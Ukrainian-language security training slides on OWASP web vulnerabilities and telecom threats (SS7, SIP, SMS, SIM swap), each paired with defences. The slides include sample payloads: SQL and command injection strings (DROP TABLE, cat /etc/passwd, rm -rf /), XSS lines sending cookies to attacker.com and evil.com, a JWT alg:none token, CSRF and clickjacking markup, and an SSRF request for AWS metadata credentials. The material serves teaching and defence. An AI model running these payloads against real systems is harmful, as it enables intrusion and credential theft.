Ін'єкції (Injection) — A03

🔓 Типи ін'єкцій

SQL Injection: вставка SQL-коду у запит до БД

' OR '1'='1
'; DROP TABLE users; --
UNION SELECT username, password FROM users--

NoSQL Injection: MongoDB, Elasticsearch

{"username": {"$gt": ""}, "password": {"$gt": ""}}

Command Injection: виконання ОС-команд

ping 8.8.8.8; cat /etc/passwd
127.0.0.1 && rm -rf /

🛡️ Захист від ін'єкцій

  • Prepared Statements / Parameterized Queries — єдиний надійний захист для SQL
  • ORM (Hibernate, SQLAlchemy) — мінімізує ручне формування запитів
  • Input Validation — whitelist замість blacklist
  • Escaping — екранування спеціальних символів
  • Least Privilege — БД-користувач з мінімальними правами
  • WAF — AWS WAF з OWASP Core Rule Set
  • SAST/DAST — автоматизоване сканування коду

✅ Правильно (Prepared Statement Java):

PreparedStatement stmt = conn.prepareStatement(
  "SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);

Порушення автентифікації та авторизації — A07/A01

⚠️ Типові вразливості

  • Слабкі паролі, відсутність MFA
  • Session fixation / hijacking
  • Predictable session tokens
  • JWT без перевірки підпису (alg:none)
  • Незахищене зберігання сесій (localStorage)
  • Відсутність обмеження спроб входу (brute force)
  • OAuth misconfiguration (open redirect, CSRF)

JWT Attack — alg:none

{"alg":"none","typ":"JWT"}.
{"sub":"admin","role":"admin"}.
[no signature]

🔐 Сучасні стандарти захисту

OAuth 2.0 + PKCE — для мобільних та SPA

Authorization Code Flow з PKCE запобігає перехопленню authorization code

JWT — кращі практики

  • Алгоритм RS256 або ES256 (asymmetric)
  • Короткий термін дії (exp): 15 хв
  • Перевірка iss, aud, exp
  • Refresh token rotation

MFA — обов'язково для критичних сервісів

TOTP (RFC 6238), WebAuthn/FIDO2, Hardware Keys

  • HttpOnly + Secure + SameSite=Strict для cookies
  • Rate limiting: max 5 спроб / 15 хв
  • Account lockout + CAPTCHA

Міжсайтовий скриптинг (XSS) — A03

💥 Типи XSS атак

Reflected XSS — у відповіді сервера одразу

https://site.com/search?q=<script>
  document.location='https://attacker.com/
  steal?c='+document.cookie
</script>

Stored XSS — зберігається в БД, атакує всіх

<img src=x onerror="fetch('https://evil.com/
?c='+btoa(document.cookie))">

DOM-based XSS — в клієнтському JavaScript

document.write(location.hash.slice(1));
// URL: page.html#<script>alert(1)</script>

🛡️ Захист від XSS

  • Output Encoding — HTML-ескейпінг виводу (&lt; &gt; &amp;)
  • Content Security Policy (CSP) — обмеження джерел скриптів
  • HttpOnly Cookies — JavaScript не може читати
  • Input Validation — відкидання небезпечних тегів
  • Trusted Types API — нові браузерні механізми
  • DOMPurify — бібліотека санітизації HTML

CSP Header приклад:

Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self';
  img-src 'self' data:;
  object-src 'none';

CSRF та Clickjacking

🔄 CSRF — Cross-Site Request Forgery

Змушує браузер жертви виконати дію від її імені на іншому сайті

Атака:

<!-- На сайті зловмисника -->
<img src="https://bank.com/transfer?
  to=attacker&amount=10000">
<!-- Cookie банку автоматично надсилається! -->

🛡️ Захист від CSRF

  • SameSite=Strict/Lax Cookie — блокує міжсайтові запити
  • CSRF Token — унікальний токен у формах
  • Double Submit Cookie патерн
  • Origin/Referer validation
  • Custom Request Header (наприклад, X-Requested-With)

🖱️ Clickjacking

Зловмисний iframe поверх легітимної кнопки вводить користувача в оману

<style>
  #victim { opacity:0.01; position:absolute;
            top:0; left:0; width:100%; height:100%; }
</style>
<iframe id="victim" src="https://bank.com/transfer">
</iframe>
<button>Клікни для приза!</button>

🛡️ Захист від Clickjacking

  • X-Frame-Options: DENY або SAMEORIGIN
  • Content-Security-Policy: frame-ancestors 'none'
  • Frame-busting JavaScript (застарілий, ненадійний метод)

✅ AWS CloudFront: додавання security headers через CloudFront Functions або Response Headers Policy

SSRF та IDOR — A10 / A01

🌐 SSRF — Server-Side Request Forgery

Сервер виконує HTTP-запит на адресу, вказану атакуючим

Атака на AWS IMDS:

GET /fetch?url=http://169.254.169.254/
  latest/meta-data/iam/security-credentials/
  EC2InstanceRole HTTP/1.1

# Відповідь: AWS_ACCESS_KEY_ID,
# AWS_SECRET_ACCESS_KEY, TOKEN

🛡️ Захист від SSRF

  • Whitelist дозволених URL/доменів
  • IMDSv2 — токен-авторизація для EC2 метаданих
  • Блокування 169.254.169.254 на рівні WAF
  • Не передавати URL від користувача напряму
  • VPC Endpoint для AWS API замість публічного доступу

🔑 IDOR — Insecure Direct Object Reference

Доступ до чужих об'єктів через передбачуваний ідентифікатор

# Horizontal escalation
GET /api/orders/1001  → свій запис
GET /api/orders/1002  → чужий запис ✗

# Vertical escalation
GET /api/admin/users  → звичайний юзер
                        → отримує адмін-дані ✗

🛡️ Захист від IDOR

  • Завжди перевіряти авторизацію: чи належить ресурс поточному користувачу?
  • Замінити числові ID на UUID (непередбачувані)
  • Attribute-based access control (ABAC)
  • Тестування: Burp Suite, OWASP ZAP, автотести
  • AWS: IAM Resource-based policies + attribute conditions

Безпека веб-API — REST та GraphQL

🔗 REST API — вразливості

  • Broken Object Level Authorization — IDOR на рівні API
  • Broken Function Level Authorization — доступ до адмін-ендпоінтів
  • Excessive Data Exposure — API повертає зайві поля
  • Mass Assignment — зміна внутрішніх полів через JSON
  • Lack of Rate Limiting — DDoS, brute force
  • Improper Inventory Management — старі версії API

Mass Assignment атака:

POST /api/users/profile
{"name": "Alice", "role": "admin",
 "balance": 999999}

🔷 GraphQL — специфічні ризики

  • Introspection — витік схеми API (вимкнути у prod)
  • Query Depth / Complexity — DoS через вкладені запити
  • Batching attacks — масовий брутфорс через batch
  • Field Suggestions — допомагає атакуючому знайти поля

🛡️ Захист API

  • API Gateway: AWS API Gateway, Kong, Apigee
  • Rate Limiting та Throttling (per user/IP/key)
  • API Versioning — /v1/, /v2/, deprecation policy
  • Schema Validation — OpenAPI / JSON Schema
  • OAuth 2.0 Scopes — мінімальні права для кожного клієнта
  • Логування всіх запитів: метод, статус, час, IP

WAF — Web Application Firewall

🔥 Що таке WAF

WAF фільтрує HTTP/HTTPS трафік на рівні L7, захищаючи від атак на застосунки

AWS WAF — можливості

  • Managed Rule Groups — готові правила OWASP Core Rule Set
  • Custom Rules — regex, IP lists, geo-blocking
  • Rate-Based Rules — захист від DDoS / brute force
  • Bot Control — виявлення та блокування ботів
  • Fraud Control — Account Takeover Prevention
  • Інтеграція: CloudFront, ALB, API Gateway, AppSync

Режими роботи WAF

  • Count — тільки логування (навчальний режим)
  • Block — блокування + відповідь 403
  • Allow — явний дозвіл для whitelist

Безпека протоколу SS7

📜 Що таке SS7

Signaling System No. 7 — набір телефонних сигнальних протоколів розроблений у 1975 р. Використовується для маршрутизації дзвінків, SMS, роумінгу між операторами. Спочатку розрахований на закриті мережі довіри — без автентифікації між операторами.

💥 Основні атаки через SS7

  • Location Tracking — MAP SendRoutingInfoForSM → отримання Cell ID абонента
  • SMS Interception — перенаправлення SMS через MAP UpdateLocation (підмінний MSC)
  • Call Interception — MAP RegisterSS (Call Forwarding на номер атакуючого)
  • DoS — MAP CancelLocation → виштовхування абонента з мережі
  • IMSI Disclosure — MAP SendRoutingInfo → отримання IMSI за номером

🛡️ Захист від SS7 атак

  • SS7 Firewall — фільтрація аномальних MAP-повідомлень
  • GSMA FS.11 — Baseline Security Controls для SS7
  • Категорія 1: блокування MAP-запитів з невідомих джерел
  • Категорія 2: обмеження небезпечних операцій (CancelLocation, InsertSubscriberData)
  • Категорія 3: захист від атак location disclosure

SMS OTP — не безпечно!

SMS OTP може бути перехоплений через SS7. NIST SP 800-63B рекомендує відмовитись від SMS як єдиного фактора автентифікації. Альтернативи: TOTP (Google Auth), FIDO2/WebAuthn, push-нотифікації.

Реальний випадок: зламано двофакторку Signal через SS7 (2017). Злом акаунту Конгресмена США через SS7 (Motherboard, 2016).

VoIP та безпека SIP

📞 Протокол SIP — огляд

Session Initiation Protocol (RFC 3261) — текстовий протокол ініціації мультимедійних сесій (дзвінки, відео, IM). Медіа передається через RTP/SRTP.

💥 Атаки на VoIP/SIP

  • INVITE Flood — DoS через тисячі INVITE-запитів
  • Registration Hijacking — перехоплення реєстрації абонента (REGISTER)
  • Call Interception — Man-in-the-Middle для RTP-потоку
  • Toll Fraud / IRSF — несанкціоновані дорогі дзвінки
  • Eavesdropping — прослуховування незашифрованого RTP
  • Vishing — Voice phishing через VoIP
  • SIP Scanning — брутфорс облікових даних (OPTIONS)

🛡️ Захист VoIP/SIP

  • SIP over TLS (SIPS) — шифрування сигналізації
  • SRTP — шифрування медіапотоку (AES-128/256)
  • ZRTP — end-to-end шифрування без PKI (Signal Protocol основа)
  • SIP Digest Authentication — мінімум; краще — сертифікати
  • Session Border Controller (SBC) — фаєрвол для SIP трафіку
  • Rate limiting INVITE per source IP
  • Geo-blocking незвичних напрямів
  • IP Reputation та blacklisting

  • Amazon Chime SDK — managed VoIP з вбудованим шифруванням
  • AWS Shield — захист від UDP/SIP DDoS

Безпека SMS та SMS-фішинг (SMishing)

📱 Вразливості SMS

  • SS7 SMS Interception — перехоплення через MAP RoutingInfo + підмінний MSC
  • SIM Swap — перенесення номера на SIM зловмисника через соціальну інженерію оператора
  • SIM Cloning — копіювання Ki/IMSI (практично тільки 2G)
  • IMSI Catcher / Stingray — фальшива базова станція для перехоплення SMS
  • A2P SMS Fraud — несанкціоновані масові розсилки через відкриті SMSC

SMishing атака — сценарій

1. Жертва отримує SMS: "Ваш банківський рахунок заблоковано. Перейдіть: bank-secure[.]app"
2. Фішинговий сайт збирає логін/пароль
3. SMS OTP перехоплюється через SS7
4. Зловмисник входить у банківський застосунок

🛡️ Захист від SMS-атак

  • SMS Firewall — фільтрація шкідливих A2P SMS, keyword blocking
  • SIM Swap Detection — API для виявлення нещодавньої зміни SIM (GSMA Open Gateway)
  • Відмова від SMS OTP → TOTP/FIDO2
  • Number Lookup / HLR Query для виявлення портованих номерів
  • Verification API (Twilio Verify, AWS SNS OTP) з аномалійним виявленням

Захист MVNO та роумінгу

📶 MVNO — Mobile Virtual Network Operator

MVNO орендує мережеву інфраструктуру у MNO. Має обмежений контроль над мережевими елементами, але повну відповідальність за безпеку своїх абонентів.

Сигнальні фаєрволи та SMS Firewall

🔥 Signaling Firewall

Захисний пристрій або програмне рішення, що інспектує та фільтрує сигнальні повідомлення (SS7 MAP, Diameter, SIP, GTP) на кордоні мережі.

Функції Signaling Firewall

  • Перевірка відповідності GT (Global Title) та IMSI
  • Блокування небезпечних MAP-операцій (Category 1, 2, 3)
  • Виявлення аномалій: location tracking patterns
  • Geo-blocking: запити з неочікуваних регіонів
  • Rate limiting per Origin-Point Code (OPC)
  • Логування та звітність для GSMA FS.11 compliance

Провідні вендори: Cellusys, NetCracker, Subex, Tektronix, P1 Security, Mobileum

📱 SMS Firewall

Фільтрує вхідні та вихідні SMS на рівні SMSC для захисту абонентів від SMishing та запобігання A2P-шахрайству.

SMS Firewall — правила фільтрації

  • Keyword Blocking — шаблони шкідливого контенту (URL-аналіз)
  • Sender ID Validation — перевірка реєстрації Sender ID
  • A2P Rate Limiting — обмеження кількості SMS від одного джерела
  • Grey Route Detection — виявлення нелегальних маршрутів A2P трафіку
  • URL Scanning — перевірка посилань у SMS через Threat Intel
  • Flash SMS Blocking — блокування Class 0 SMS-атак

GSMA Guidelines

  • GSMA FS.11 — SS7 Baseline Security Controls
  • GSMA PRD IR.70 — Interconnection SMS guidelines
  • GSMA PRD IR.71 — SMS Firewall requirements

Атаки на абонентів: соціальна інженерія

🎭 Основні вектори атак

Vishing (Voice Phishing)

Дзвінок від "банку", "поліції", "служби підтримки". Часто використовує caller ID spoofing для показу легітимного номера. AI-generated голоси у 2024+.

SMishing (SMS Phishing)

Шкідливі SMS з фішинговими посиланнями, підробка Sender ID банків та держорганів, OTP-перехоплення.

SIM Swap Attack

  • 1. Збір OSINT про жертву (соц. мережі, дата народження)
  • 2. Дзвінок до оператора: "я втратив телефон, перенесіть номер"
  • 3. Оператор переносить номер на SIM зловмисника
  • 4. Перехоплення всіх SMS OTP, скидання паролів
  • 5. Злом банківських рахунків, крипто-гаманців

🛡️ Захист від соціальної інженерії

  • STIR/SHAKEN — стандарт автентифікації caller ID (RFC 8226, ATIS-1000074)
  • SIM Swap Detection API — перевірка чи не змінилась SIM нещодавно (GSMA Open Gateway)
  • Відмова від SMS OTP → FIDO2/WebAuthn або TOTP
  • Strong identity verification для SIM transfer (biometrics)
  • SMS Firewall: блокування підробки Sender ID
  • Навчання абонентів: банки не запитують OTP по телефону

STIR/SHAKEN — Caller ID автентифікація

Оператор підписує дзвінки цифровим сертифікатом (PASSporT token). Приймаючий оператор перевіряє підпис через PKI. Атестація A/B/C відображає рівень довіри до caller ID. Обов'язково в США (FCC), впроваджується в ЄС та Україні.

Zero Trust для телеком-інфраструктури

🚫 Zero Trust принципи в телекомі

"Ніколи не довіряй, завжди перевіряй" — жоден вузол, сервіс або абонент не є довіреним за замовчуванням, навіть всередині мережі.

  • Кожна NF автентифікується: сертифікат X.509 + NRF OAuth 2.0 token
  • Мікросегментація: окремий namespace / VPC per NF
  • mTLS між усіма внутрішніми сервісами (Service Mesh: Istio/Linkerd)
  • Least privilege IAM per NF/мікросервіс
  • Continuous verification: перевірка не лише при підключенні
  • Шифрування East-West трафіку (всередині core network)

Istio Service Mesh для 5G SBA

Istio автоматично інжектує Envoy sidecar proxy до кожної NF pod у Kubernetes. mTLS увімкнено між усіма podами. Policy enforcement через AuthorizationPolicy. Доповнює NRF OAuth 2.0.
